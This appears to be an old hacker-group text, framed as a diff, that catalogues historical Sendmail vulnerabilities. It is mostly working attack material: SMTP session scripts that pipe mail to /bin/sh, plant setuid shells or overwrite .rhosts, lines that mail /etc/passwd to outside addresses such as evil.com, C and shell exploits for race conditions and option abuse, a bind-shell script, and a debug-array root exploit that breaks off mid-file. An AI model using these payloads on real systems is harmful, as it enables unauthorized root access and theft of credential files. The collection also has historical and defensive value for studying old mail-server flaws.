@@ -1,0 +1,3647 @@
+ ###########         #                   ###             #########      ##     # 
+ ############       ###                 #####           ###  #####     ###     ##
+ #####    ####     #####               #######         ###    ###     ####    ###
+ #####    #####   #######             #########       ###      #      ####  ####
+  ####   #####    #######            ###########     ###               ### ####
+   #########      #######           ####     ####    ###               #######  
+    ###########    #####           #####     #####    ###     ##      ####### 
+   #############    ###   ##      ######  #########    ###   ####     #########
+  ######     ####    #   ####      ########  #####      ##  ######     ###   ###
+ ######     ####     ##########     ####     ####        #########     ###  #####
+ #####     ####       ##########     ###     ###          #######     ####  ######
+ #############         ##########     ##     ##            #####      ####   ####
+ ###########            ########      ##     ##             ###        ###    ##
+
+   #######       #     #        #     #
+  ##########    ##     ##      ##     ##            
+ ###    ###     ##     ##     ###     ###                                         
+  ###    #     ###     ###   #####    ####           Black Sun Research Facility  
+    ###         ##     ##    ######   ####             http://blacksun.box.sk     
+      ###       ##     ##    #######  ####                 ASCII By : cyRu5       
+   #   ###     ###     ###   ####  #######         
+  ###  ####   ####     ####   ###   #####               
+ ###########   ###########     ##    ###
+  #########      #######        #     #
+_______________________________________________________________________
+
+Various Sendmail Holes: By Ankit Fadia <ankit@bol.net.in>
+_______________________________________________________________________
+
+Sendmail, known as the buggiest daemon on earth has a history of having
+A large number of bugs. In this text, I have made a list of known
+Sendmail holes. Of course, the list is not complete, but it's an
+example of how many bugs Sendmail has had over the years.
+I also recommend that you read the Sendmail security tutorial at
+http://blacksun.box.sk in order to get a better view of what exactly is
+Sendmail.
+
+-----------------------------------------------------------------------
+
+  Hole                         Version of Sendmail
+
+-----------------------------------------------------------------------
+
+= WIZ =                        *oLD*
+
+= DEBUG =                      *oLD*
+
+= TURN =                       *oLD*
+
+= OVERFLOW INPUT BUFFER =      *oLD*
+
+= DECODE ALIAS =               *VrFy*
+
+= qf SunOS =                   *SunOS-sendmailV5.1*
+
+= -oR SunOS =                  *SunOS-sendmailV5.22*
+
+= -oM =                        *8lgm6Dec1994-SMI-Sendmail(sm based on SunOS)*
+
+= OVERWRITE FILES =            *FiXED iN 5.59*
+
+= -oQ =                        *DuNNo*
+
+= |PROGRAM =                   *TeSTeD oN 5.55*
+
+= .forward =                   *5.61*
+
+= TAIL =                       *TeSTeD oN 5.65*
+
+= -C =                         *oLD*
+
+= 4.1 =                        *TeSTeD oN 4.1*
+
+= -d########### =              *8.X.X <8.6.7*
+
+= -oE/filename bounce=         *8.6.7*
+
+= 8.6.9 ident =                *8.6.9*
+
+= 8.6.9 newlines =             *8.6.9*
+
+= 8.6.10 ident/newlines =      *8.6.10*
+
+= HP-UX =                      *HP-UX 9.x*
+
+= 8.7.5 gecos =                *8.X.X <8.8.0* *TeSTed oN 8.6.12*
+
+= mime7to8() =                 *8.8.0*
+
+= smtpd =                      *8.7-8.8.2*
+
+=Local DOS=                    *Upto 8.9.3*
+
+=Buggy Helo Command=           *8.8.8*
+
+=Gaint Sendmail Bug=           *8.8.4*
+ 
+
+-----------------------------------------------------------------------
+
+WIZ = *oLD* =
+
+The oldest and easiest hole in sendmail is the 'wiz' backdoor, now very
+difficult to find. At the connect just type 'wiz' and then 'SHELL' ,and
+you're in a root shell. [ it can be set by configuring sendmail.cf file ...
+'OW' option immediately followed by the encrypted password ]
+
+DEBUG = *oLD* =
+
+This bug was used by the inet worm by Robert T. Morris Jr. Its exploiting
+allows anyone to execute any program on a remote machine. It simply
+consists in giving the 'debug' command, use a pipe to /bin/sh as recipient
+and feed the data with the commands you want to be executed on the remote
+machine.
+
+[ If sendmail server answers with "200 Debug set" to the 'debug' command
+there are good chances the bug is still present ]
+
+Example :
+
+#!/bin/sh
+
+telnet << EOF
+
+open fucked.host.edu 25
+
+debug
+
+mail from: </dev/null>
+
+rcpt to: <\"|sed -e '1,/^$/'d | /bin/sh ; exit 0\">
+
+data
+
+cp /bin/sh /tmp/sushi          # or alternatively:
+
+chmod 4755 /tmp/sushi          # echo "+ +" >> /.rhosts
+
+.
+
+EOF
+
+TURN = *oLD* =
+
+TURN command allows mail to be stolen ... [ Don't bother, old stuff! ]
+
+OVERFLOW INPUT BUFFER = *oLD* =
+
+Cause the sendmail deamon to lock up ... [ old stuff! Just for collection
+;) ]
+
+DECODE ALIAS = *VrFy* =
+
+If '/etc/aliases' contains "|/usr/bin/uudecode" anyone can send mail to
+decode, write to any file onwed by daemon, if they can connect to sendmail
+daemon, can write to any file owned by any user.
+
+To test the existence of decode alias from a sendmail connection do:
+
+% telnet target.com
+
+Trying 127.127.127.127
+
+Connected to target.com
+
+Escape character is '^]'.
+
+220 target.com Sendmail Sendmail 5.55/victim ready at Fri, 6 Nov 93 18:00 PDT
+
+expn decode
+
+250 <"|/usr/bin/uudecode">
+
+quit
+
+1SecExploit:
+
+% echo "myhost.com" | uuencode /usr/bin/.rhosts | mail decode@target.com
+
+MoreThan1SecExploit:
+
+% cat > outfile                  # Let's make our .rhosts file
+
++ +
+
+^C
+
+% uuencode outfile /usr/bin/.rhosts
+
+begin 644 /bin/.rhosts
+
+$*R'K"O\
+
+% telnet fuqdhost.com 25
+
+220 fuqdhost.com SunOS Sendmail 8.6.1 #5 ready at Fri, 13 May 99 00:00 (EST)
+
+VRFY decode
+
+250 <|/usr/bin/uudecode>
+
+MAIL FROM: bin
+
+250  ... Sender Okay
+
+RCPT TO: decode
+
+250  ... Recipient Okay
+
+DATA
+
+354 Enter mail, end with "." on a line by itself
+
+begin 644 /bin/.rhosts
+
+$*R'K"O\                       # which is just "+ +" uuencoded
+
+end
+
+.
+
+250 Mail accepted
+
+quit
+
+221 fuqdhost.com closing connection
+
+Connection closed by foreign host.
+
+% rlogin fuqdhost.com -l bin
+
+$
+
+If no home directories are known or writable, an interesting variation of
+this is to create a bogus /etc/aliases.pag file that contains an alias with
+a command you wish to execute on your target. This may work since on many
+systems the aliases.pag and aliases.dir files, which control the system's
+mail aliases, are writable to the world.
+
+ evil % cat decode
+
+ bin: "| cat /etc/passwd | mail zen@evil.com"
+
+ evil % newaliases -oQ/tmp -oA`pwd`/decode
+
+ evil % uuencode decode.pag /etc/aliases.pag | mail decode@victim.com
+
+ evil % /usr/lib/sendmail -fbin -om -oi bin@victim.com < /dev/null
+
+qf SunOS = SunOS-sendmailV5.1 =
+
+The method used by sendmail version 5 to open a control file
+[/usr/spool/mqueue/qf########] is unsecure. A race condition exists whereby
+another process may obtain a control-file file descriptor, opened for write
+access. Sendmail v5, during execution, sets umask(0), which is an insecure
+mask. In order not to leave open control files with mode 666, sendmail v5
+uses chmod(2) to set a secure file mode. However this is a race condition,
+as we can obtain an open file descriptor for write by opening the control
+file before the call to chmod(2).
+
+IMPACT: Local users can write their own control files, and run programs
+
+        as any user, bar root.
+
+EXPLOIT:
+
+grabfd.c:
+
+/*
+
+ * grabfd.c
+
+ * usage: grabfd username command-file
+
+ *
+
+ *      username: user to execute 'command-file' as.
+
+ *      command-file: file containing 10 lines of shell commands to execute.
+
+ */
+
+#include <stdio.h>
+
+#include <unistd.h>
+
+#include <sys/fcntl.h>
+
+#include <sys/param.h>
+
+#ifndef SENDMAIL
+
+#define SENDMAIL "/usr/lib/sendmail"
+
+#endif
+
+#ifndef SPOOL_DIR
+
+#define SPOOL_DIR "/usr/spool/mqueue"
+
+#endif
+
+char myqfile[] = "D%s\nC%s\nR|/usr/ucb/tail|/bin/sh\n";
+
+main(argc,argv)
+
+int argc;
+
+char **argv;
+
+{
+
+        int pid, fd;
+
+        char tbuf[MAXPATHLEN], sysbuf[BUFSIZ];
+
+        if (argc != 3) {
+
+                (void)fprintf(stderr, "%s: user file\n",
+
+                        argv[0]);
+
+                exit(1);
+
+        }
+
+        if (getpwnam(argv[1]) == NULL)
+
+                (void)fprintf(stderr, "%s: user %s unknown (error
+
+ignored)\n",
+
+                        argv[0],
+
+                        argv[1]);
+
+        if (access(argv[2], F_OK) == -1) {
+
+                (void)fprintf(stderr, "%s: %s does not exist.\n",
+
+                       argv[0],
+
+                       argv[2]);
+
+                exit(1);
+
+        }
+
+        if (access(SPOOL_DIR, X_OK) == -1) {
+
+                (void)fprintf(stderr, "%s: cannot access %s.\n",
+
+                        argv[0],
+
+                        SPOOL_DIR);
+
+                exit(1);
+
+        }
+
+        if (pid=fork()) {
+
+                if (pid == -1) {
+
+                        (void)perror("fork");
+
+                        exit(1);
+
+                }
+
+                (void)sprintf(tbuf, "%s/tfAA%05d", SPOOL_DIR, pid);
+
+                (void)sprintf(sysbuf, myqfile, argv[2], argv[1]);
+
+                for (;;)
+
+                        if ((fd=(open(tbuf, O_WRONLY, 0))) != -1) {
+
+                                (void)printf("%s: grabbed queue fd.\n",
+
+                                             argv[0]);
+
+                                (void)wait();
+
+                                (void)ftruncate(fd, 0);
+
+                                (void)write(fd, sysbuf, strlen(sysbuf));
+
+                                (void)close(fd);
+
+                                if(execl(SENDMAIL,
+
+                                      "sendmail", "-q", (char *)0) == -1) {
+
+                                        (void)perror("execl");
+
+                                        exit(1);
+
+                                        };
+
+                        }
+
+        } else {
+
+                (void)close(0);
+
+                if (open("/etc/motd", O_RDONLY, 0) == -1) {
+
+                        (void)perror("open");
+
+                        exit(1);
+
+                };
+
+                if (execl(SENDMAIL,
+
+                          "sendmail",
+
+#ifdef sun
+
+                          "-os",
+
+#endif
+
+                          "-odq", getlogin(), (char *)0) == -1) {
+
+                        (void)perror("execl");
+
+                        exit(1);
+
+                };
+
+        }
+
+        exit(1);
+
+}
+
+::::::::::::::::::::::::::::::::: END OF HOLE ::::::::::::::::::::::::::::
+
+-oR SunOS = SunOS-4.1.X-sendmail V5.22 =
+
+From 8lgm:
+
+DESCRIPTION: The -oR option uses popen() to return undeliverable mail.
+
+IMPACT: Local users can obtain root access.
+
+-------------------------- ropt.sh ---------------------------------------
+
+#!/bin/sh
+
+#
+
+# Syntax: roption host
+
+#
+
+# host is any system running sendmail (except localhost).
+
+#
+
+# This exploits a flaw in SunOS sendmail(8), and attempts
+
+# create a suid root shell
+
+#
+
+# Written 1995 by [8LGM]
+
+# Please do not use this script without permission.
+
+#
+
+PROG="`basename $0`"
+
+PATH=/usr/ucb:/usr/bin:/bin      export PATH
+
+IFS=" "                          export IFS
+
+# Check args
+
+if [ $# -ne 1 ]; then
+
+        echo "Syntax: $PROG host"
+
+        exit 1
+
+fi
+
+# Check we're on SunOS
+
+if [ "x`uname -s`" != "xSunOS" ]; then
+
+        echo "Sorry, this only works on SunOS"
+
+        exit 1
+
+fi
+
+PROG="`basename $0`"
+
+EXECME=/tmp/HotterThanMojaveInMyHeart
+
+# Create EXECME.c
+
+cat > $EXECME.c << 'EOF'
+
+main(argc,argv)
+
+int argc;
+
+char *argv[];
+
+{
+
+        chown("/tmp/InfamousAngel", 0, 0);
+
+        chmod("/tmp/InfamousAngel", 04755);
+
+}
+
+EOF
+
+cc -o $EXECME $EXECME.c
+
+# Check we have EXECME
+
+if [ ! -x $EXECME ]; then
+
+        echo "$PROG: couldnt compile $EXECME.c - check it out"
+
+        exit 1
+
+fi
+
+/bin/cp /bin/sh /tmp/InfamousAngel
+
+# Run sendmail
+
+/usr/lib/sendmail -oR$1 -f";$EXECME;" -t << 'EOF'
+
+To: No1InParticular
+
+Hows it goin
+
+EOF
+
+exec /tmp/InfamousAngel
+
+................................ Cut HeRe ...................................
+
+-oM = 8lgm6Dec1994-SMI-Sendmail(based on SunOS sm) =
+
+Sun sendmail allows -oM to set any macro, and still retains root privilege.
+( The list of 'trusted' macros should be limited. )
+
+At time of writing (Dec 1994) affected sendmail were: " SunOS 4.x Sendmail
+- all versions including latest 4/5/94 Sendmail Jumbo Patch 100377-15 "
+
+After further investigation, it has been discovered that SVR4 based ports
+include sendmail(8) based on SMI code.
+
+EXPLOIT:
+
+  1. Create the file sunsendmailcp
+
+     8>------------------------- cut here ---------------------------
+
+     #!/bin/sh
+
+     #
+
+     # sunsendmailcp from to
+
+     if [ $# -ne 2 ]; then
+
+             echo usage: `basename $0` from to
+
+             exit 1
+
+     fi
+
+     rm -f /usr/tmp/dead.letter
+
+     if [ -f /usr/tmp/dead.letter ]; then
+
+             echo sorry, cant continue - /usr/tmp/dead.letter exists
+
+     fi
+
+     if [ ! -r $1 ]; then
+
+             echo $1 doesnt exist or is unreadable
+
+             exit 1
+
+     fi
+
+     ln -s $2 /usr/tmp/dead.letter
+
+     /usr/lib/sendmail -L0 '-oM#anything' $USER < $1
+
+     rm /usr/tmp/dead.letter
+
+     exit 0
+
+     8>------------------------- cut here ---------------------------
+
+  2. Execute the command % ./sunsendmailcp sourcefile targetfile and target
+     file will either be appended to or created.
+
+OVERWRITE FILES = FiXED iN 5.59 =
+
+Remote users are able to write to any non-root owned files in the system.
+This bug was definitely fixed in version 5.59 from Berkeley; despite the
+messages below, for versions of sendmail previous to 5.59, the "evil.com"
+gets appended, despite the error messages, along with all of the typical
+mail headers, to the file specified:
+
+ % cat evil_sendmail
+
+ telnet victim.com 25 << EOSM
+
+ rcpt to: /home/zen/.rhosts
+
+ mail from: zen
+
+ data
+
+ random garbage
+
+ .
+
+ rcpt to: /home/zen/.rhosts
+
+ mail from: zen
+
+ data
+
+ evil.com
+
+ .
+
+ quit
+
+ EOSM
+
+ evil % /bin/sh evil_sendmail
+
+ Trying 128.128.128.1
+
+ Connected to victim.com
+
+ Escape character is '^]'.
+
+ Connection closed by foreign host.
+
+ evil % rlogin victim.com -l zen
+
+         Welcome to victim.com!
+
+ victim %
+
+'-oQ' = DuNNo =
+
+This bug involves the '-q' and the '-oQ' options and causes any file to be
+deleted and read. You should create a 'qf'-type file, in the
+/usr/spool/mqueue dir, like this:
+
+P28
+
+T599831504
+
+Dfilename
+
+Suser
+
+Ruser
+
+H?P?return-path:
+
+H?F?from: user (User Name)
+
+H?x?full-name: User Name
+
+HTo: user
+
+Hsubject: Gotcha
+
+after the command `sendmail -q -oQ' is issued, file `filename' will be
+deleted and its content will be mailed to 'user'.
+
+- - - - The 'oQ' sets the 'Q' option ,which selects the dir in which to
+queue messages The 'q' make the daemon to process the queue - - - -
+
+'|PROGRAM ' = TeSTeD oN 5.55 = ...may be others
+
+Anyone can specify arbitrary shell commands and/or pathnames for the sender
+and/or destination address. A typical attack to get the password file is:
+
+ % telnet target.com 25
+
+ Trying 123.456.789.0...
+
+ Connected to target.com
+
+ Escape character is '^]'.
+
+ 220 target.com Sendmail 5.55 ready at Mon, 12 Dec 93 23:51
+
+ mail from: "|/bin/mail me@myhost.com < /etc/passwd"
+
+ 250 "|/bin/mail me@myhost.com < /etc/passwd"... Sender ok
+
+ rcpt to: mickeymouse
+
+ 550 mickeymouse... User unknown
+
+ data
+
+ 354 Enter mail, end with "." on a line by itself
+
+ .
+
+ 250 Mail accepted
+
+ quit
+
+ Connection closed by foreign host.
+
+ %
+
+.forward = 5.61 =
+
+When delivering to files and programs, `sendmail' does not do an
+`initgroups(3)' after forking on final delivery. As a result, the sender's
+group list remains in effect throughout this stage. This is particularly
+serious when root is sending the mail since a program executed out of a
+`.forward' file gains interesting privileges like `wheel' and `kmem'. A
+related hole can be broken down into a "problem" and an "aggravation". The
+"problem" is that queued local mail no longer has the original recipient's
+uid associated with it. Control files only store a list of exploded
+recipients (i.e. users, files and programs) -- one per line -- each
+prefaced with an `R'.
+
+So, after an address resolves to the local machine and has undergone alias
+and ".forward" expansion, if the letter happens to get queued, on the
+succeeding queue run sendmail doesnt know who to run the final delivery as.
+The "aggravation" is that, when doing this final delivery of queued local
+mail, sendmail will `setuid()' itself to the sender's uid if it is
+available; in general, the sender's uid will be used when the sender is on
+the local machine. As a result, a user can run a program as anyone who
+sends them mail from the local machine. There is also an added
+"complication"; the default uid and gid are also set to the sender when
+delivering mail! Since the default uid and gid are only used when calling
+`setuid()' and `setgid()' (to reset the uid/gid before doing final
+delivery), these variables should never be set to the sender.
+
+              |------------------------------ Local compromise
+                      ------------------------------|
+
+Save the following program as "sploit.c" changing MYUID to your user id.
+Compile "sploit.c" producing the executable "sploit" in your home
+directory. Create a ".forward" file containing:
+
+     \<user>, "|<path>/sploit"
+
+[change to your username so you dont lose mail (unless, of course, you'd
+rather lose mail) and set <path> to your home directory path (where sploit
+lives)] Now, as another user, send yourself some mail. Note that the sploit
+program defers delivery the first time thru; check out "/tmp/whoami" to see
+that sploit ran as you. Now, run your mail queue (or open a beer and wait
+for sendmail to run it). After the queue run, note that the sploit accepted
+the letter and returned a successful exit status; check out "/tmp/whoami"
+again to see that this time, sploit ran as the sender! You can also use
+"sploit.c" to test for the root initgroups() hole by checking the group
+list when "sploit" was first called.
+
+     #include <sys/param.h>
+
+     #include <sys/types.h>
+
+     #include <stdio.h>
+
+     #include <sysexits.h>
+
+     #include <pwd.h>
+
+     #include <grp.h>
+
+     #define MYUID 777 /* your uid (i.e. your ".forward" invokes this) */
+
+     #definegetuser(uid)getpwuid(uid)->pw_name/* assume valid uid */
+
+     #definegetgrp(gid)getgrgid(gid)->gr_name/* assume valid gid */
+
+     main()
+
+     {
+
+     FILE *fp;
+
+     uid_t myuid;
+
+     int i, rval, ngrps, grplst[NGROUPS];
+
+     if ((myuid = getuid()) == MYUID)
+
+     rval = EX_TEMPFAIL;
+
+     else
+
+     rval = EX_OK;
+
+     if ((fp = fopen("/tmp/whoami", "a")) != NULL) {
+
+     /* real user/group ids */
+
+     fprintf(fp, "%susr:%s grp:%s",
+
+     (rval == EX_OK)? "": "Def> ",
+
+     getuser(myuid), getgrp(getgid()));
+
+     /* effective user/group ids */
+
+     fprintf(fp, " eusr:%s egrp:%s",
+
+     getuser(geteuid()), getgrp(getegid()));
+
+     /* group list */
+
+     if ((ngrps = getgroups(NGROUPS, grplst)) > 0) {
+
+     fprintf(fp, " grps:");
+
+     for (i = 0; i < ngrps; i++)
+
+     fprintf(fp, " %s", getgrp(grplst[i]));
+
+     }
+
+     fprintf(fp, "\n");
+
+     (void) fclose(fp);
+
+     }
+
+     exit(rval);
+
+     }
+
+--------------------- CuT HeRe -------------------------------------------------
+
+=====================  trick for sendmail 5.61  ===========================
+
+/*
+
+ * 1) set the #define UID, at the top of the program to be your's
+
+ * 2) create a file: /tmp/.shell, which is a script to make a suid shell
+
+ * 3) compile the program and name it say, /tmp/.magic
+
+ * 4) create a .forward file containing: '|/tmp/.magic'
+
+ * 5) 'telnet yoursystem 25' and send yourself some fakemail from whoever
+
+ *    you want a shell from (but not root :-( RATS!)
+
+ * 6) wait abit, it usually works ...
+
+ */
+
+#define UID 777   /* change to your uid */
+
+#include <sys/param.h>
+
+#include <sys/types.h>
+
+#include <stdio.h>
+
+#include <sysexits.h>
+
+#include <pwd.h>
+
+#include <grp.h>
+
+#define SHELLFILE  "/tmp/.shell"
+
+main()
+
+        int myuid, rval;
+
+        if ((myuid = getuid()) == UID)
+
+                rval = EX_TEMPFAIL;
+
+        else {
+
+                rval = EX_OK;
+
+                system(SHELLFILE);
+
+        }
+
+        exit(rval);
+
+}
+
+------------------------------ CuT HeRe --------------------------------
+
+Tail creates a daemon shell = TeSTeD oN 5.65 =
+
+Through this sendmail bug, it is possible to become uid daemon (or whatever
+your sendmail delivers non-user mail as), or the uid of any user. The
+specifics are as follows:
+
+   * The envelope From: field, or possibly the Errors-To: header (but I've
+     not tested it), must be set to the pipe through a bounce of your mail
+     will be returned. Typically this is executed by uid daemon.
+   * An error must be caused in the message such that sendmail will send a
+     bounce to the From: envelope (or possibly to Errors-To:).
+
+These two conditions are all that is necessary to exploit the bug.
+Typically the simplest thing to pipe to is
+
+
+
+        |/usr/ucb/tail|/usr/bin/sh
+
+aka     |/usr/ucb/tail|/bin/sh
+
+That's for SunOS 4.1.3. Other systems may have tail in /usr/bin or /bin/;
+the PATH is important in the case.
+
+The condition we have used to generate an error is an invalid
+Return-Receipt-To: header. There are a plethora of other ways to do so, and
+some of them may depend on the specifics of your sendmail; be forewarned.
+
+The last ten lines of your message should contain whatever you wish to do
+as uid daemon.
+
+---cut here
+
+[panix!jhawk] |% telnet panix.com 25
+
+Trying 198.7.0.2 ...
+
+Connected to panix.com.
+
+Escape character is '^]'.
+
+220 panix.com 5.65c/IDA-1.4.4 Sendmail is ready at Mon, 8 Nov 1993 19:41:13
+
+-0500
+
+HELO
+
+250 Hello panix.com, why do you call yourself ?
+
+MAIL FROM: |/usr/ucb/tail|/usr/bin/sh
+
+250 |/usr/ucb/tail|/usr/bin/sh... Sender ok
+
+RCPT TO: root
+
+250 root... Recipient ok
+
+DATA
+
+354 Enter mail, end with @.@ on a line by itself
+
+ From: jhawk"panix.com (John Hawkinson)
+
+  To: jhawk"panix.com (John Hawkinson)
+
+  Return-Receipt-To: |foobar
+
+  Subject: This is a large hole in the ground.
+
+  X-Disclaimer: We take no responsibility for what might happen
+
+  Hi there. Wanna play ball?
+
+  #!/bin/sh
+
+  #The above line is just in case :-)
+
+  echo This is a Serious Bug > /tmp/bug
+
+  echo id reports: >> /tmp/bug
+
+  /usr/bin/id >> /tmp/bug
+
+  echo Fixing this would be good >> /tmp/bug
+
+  cp /bin/sh /tmp/bugshell
+
+  chmod u+s /tmp/bugshell
+
+  echo /tmp/bugshell contains a setuid daemon shell >> /tmp/bug
+
+  chmod ugo+rx /tmp/bugshell
+
+.
+
+250 Ok
+
+quit
+
+221 panix.com closing connection
+
+------------------------- CuT HeRe ----------------------------------------
+
+"-C" = oLD =
+
+Read any file. Using the '-C' option causes an alternative configuration
+file to be used, if the file is a protected file which is actually not a
+send mail configuration file, `sendmail' will print out some contents of
+the file as an error message.
+
+It is reported working on DYNIX (3.0.14) and ULTRIX (2.X)
+
+$ sendmail -C /etc/shadow
+
+<contents of /etc/shadow>
+
+
+
+4.1 = TeSTeD oN 4.1 =
+
+It allows remote access as bin...and since bin owns the /etc dir you can
+gain root.
+
+Rsend needs mconnect, which is a binary, which just connects to the place
+and sends the data. You can get rid the of ()'s at the beginninga and end
+of the script, and get rid of the mconnect line, and run like ./rsend >
+file, then ascii U/L the file to port 25...If it says a lot of stuff like
+"Command Ununown" 25 times, then it didn't work.
+
+Here's rsend:
+
+#!/bin/sh
+
+# Copyright, 1992, 1993 by Scott Chasin (chasin@crimelab.com)
+
+#
+
+# This material is copyrighted by Scott Chasin, 1992, 1993. The
+
+# usual standard disclaimer applies, especially the fact that the
+
+# author is not liable for any damages caused by direct or indirect
+
+# use of the information or functionality provided by this program.
+
+#
+
+# Description:
+
+#
+
+# Exploit NEW sendmail hole  and bind a port so we can spawn a program.
+
+# Not for distribution under any circumstances
+
+#
+
+# Usage: smail
+
+# default: smail   <7001>
+
+port=$3
+
+user=$2
+
+cmd=$4
+
+if [ -z "$2" ]; then
+
+   user=daemon
+
+fi
+
+if [ -z "$3" ]; then
+
+   port=7002
+
+fi
+
+if [ -z "$4" ]; then
+
+   cmd="/bin/csh -i"
+
+fi
+
+(
+
+sleep 4
+
+echo "helo"
+
+echo "mail from: |"
+
+echo "rcpt to: bounce"
+
+echo "data"
+
+echo "."
+
+sleep 3
+
+echo "mail from: $user"
+
+echo "rcpt to: | sed '1,/^$/d' | sh"
+
+echo "data"
+
+echo "cat > /tmp/a.c <
+
+#include <sys/signal.h>
+
+#include <sys/socket.h>
+
+#include <netinet/in.h>
+
+#include <netdb.h>
+
+reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
+
+int **av;{struct sockaddr_in mya;struct servent *sp
+
+;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
+
+signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
+
+0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
+
+sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
+
+==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
+
+=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
+
+(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
+
+1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
+
+(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
+
+loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
+
+==0){for(x=2;x
+
+Or you can also ul this to port 25. BTW, it gets you in by running a
+program that listens to port 7008... you telnet to port 7008. You can then
+proceed to create new users in /etc/passwd because you own the /etc
+dir...you need to type a ; after every command, and it gives you 1 error
+every command...ignore it. The process may be noticed by a few admins.
+
+helo
+
+mail from: |
+
+rcpt to: bounce
+
+data
+
+.
+
+mail from: bin
+
+rcpt to: | sed '1,/^$/d' | sh
+
+data
+
+cat > /tmp/a.c <
+
+#include <sys/signal.h>
+
+#include <sys/socket.h>
+
+#include <netinet/in.h>
+
+#include <netdb.h>
+
+reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
+
+int **av;{struct sockaddr_in mya;struct servent *sp
+
+;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
+
+signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
+
+0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
+
+sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
+
+==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
+
+=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
+
+(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
+
+1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
+
+(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
+
+loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
+
+==0){for(x=2;x
+
+-d########### = TeSTeD oN SunOS & SunOS with Sendmail8.6.4 =
+
+This bug is present in all 8.X.X sendmail versions prior to 8.6.7 Here
+follow excerpts from Michael Widner's message on Bugtraq with his script
+for SunOs and Solaris, and another script tested on SunOS 5.2 with sendmail
+8.6.4:
+
+"The important thing to know is that if your sendmail crashes when you pass
+it something like -d387654321 then it can most likely be exploited to gain
+root access.
+
+Without going into much detail, -dx.y writes y into the debug array as
+array[x]=y. Range checking is not performed properly on x, so it's possible
+to pass negative integers that pass the range check. Find a key location
+before the debug array, over write it, and you're in business.
+
+The problem in trying to create a generic script is that the 'key'
+locations have different offsets from the debug array for every version of
+sendmail. Sometimes they're easy to locate if you can get a core, but
+sometimes it is tough to get a core w/o already being root. Also, sometimes
+a core tells you nothing.
+
+The following script is Sun specific, and patches are now available for all
+versions of Sun sendmail. The script creates a suid root owned copy of
+/bin/sh and places it in /tmp. If you're hacking solaris, I'd suggest you
+choose some program other than /bin/sh. "
+
+#!/bin/sh
+
+# This script takes advantage of sendmail's (mis)interpretation of
+
+# very large unsigned ints as signed ints when accessing the debug
+
+# array.  As it, it will work with the 8 versions of sun sendmail
+
+# that I have access to.  Perhaps I'll update it if I find new
+
+# versions of sun sendmail.
+
+# NOTE:  This is a Sun specific script.  Don't expect it to work with
+
+#        any non-sun sendmail.
+
+# -Michael R. Widner (atreus)        3/25/94
+
+#
+
+# usage:  smdhole [/path/to/suid/sendmail]
+
+#
+
+# add /usr/ucb to path so solaris can find `whoami` (4/18/94)
+
+path=$path:/usr/ucb
+
+if [ $1x = x ]; then
+
+        sendmail=/usr/lib/sendmail
+
+else
+
+        echo "Trying to abuse $1."
+
+        sendmail=$1
+
+fi
+
+sm_size=`echo \`ls -l $sendmail\` | cut -d" " -f4,5 | sed "s/[^0-9]//g`
+
+# prefix and suffix for -1 as unsigned integer.  Actually, this is
+
+# off by two.  you figure out why.
+
+prefix=42949
+
+suffix=67297
+
+case $sm_size in
+
+        132064)
+
+                n1=${prefix}52864
+
+                n2=${prefix}52865
+
+                n3=${prefix}52866
+
+                echo Patched solaris w/o mx.
+
+                ;;
+
+        134752) # ug! dropped a 0 before.  fixed 4/18/94
+
+                n1=${prefix}01656
+
+                n2=${prefix}01657
+
+                n3=${prefix}01658
+
+                echo Patched solaris sendmail.mx
+
+                ;;
+
+        130860)
+
+                n1=${prefix}53016
+
+                n2=${prefix}53017
+
+                n3=${prefix}53018
+
+                echo Un-patched solaris w/o mx.
+
+                ;;
+
+        133548) # ug! dropped a 0 before.  fixed 4/18/94
+
+                n1=${prefix}01808
+
+                n2=${prefix}01809
+
+                n3=${prefix}01810
+
+                echo Un-patched solaris sendmail.mx
+
+                ;;
+
+        139264)
+
+                n1=${prefix}49609
+
+                n2=${prefix}49610
+
+                n3=${prefix}49611
+
+                echo Sun 4.1.3 sendmail - could be either of two versions
+
+                n4=${prefix}49265
+
+                n5=${prefix}49266
+
+                n6=${prefix}49267
+
+                ;;
+
+        155648)
+
+                n1=${prefix}46953
+
+                n2=${prefix}46954
+
+                n3=${prefix}46955
+
+                echo Sun 4.1.3 sendmail.mx - could be either of two versions
+
+                n4=${prefix}46609
+
+                n5=${prefix}46610
+
+                n6=${prefix}46611
+
+                ;;
+
+        *)
+
+                echo "I don't know what version of sendmail $sendmail is."
+
+                echo -n "Look for other versions of sendmail[.mx] on the "
+
+                echo "system and re-run this as:"
+
+                echo "     $0 /path/to/another/suid/sendmail"
+
+                echo
+
+                echo "Let me see if I can suggest anything..."
+
+                find /usr/lib /var/sadm/patch -name "*sendm*" -perm -4001
+
+-ls 2>/dev/null
+
+                exit 1
+
+                ;;
+
+        esac
+
+cat << EOM > /tmp/sendmail.cf
+
+DMether
+
+DRlocalhost
+
+CRlocalhost
+
+CDMailer-Daemon root daemon uucp
+
+DlFrom \$g  \$d
+
+Do.:%@!^=/[]
+
+Dq\$g\$?x (\$x)\$.
+
+De\$j nothing
+
+OA./aliases
+
+OF0666
+
+Og1
+
+OL0
+
+Oo
+
+OPPostmaster
+
+OQ.
+
+Os
+
+Ou1
+
+T root daemon uucp
+
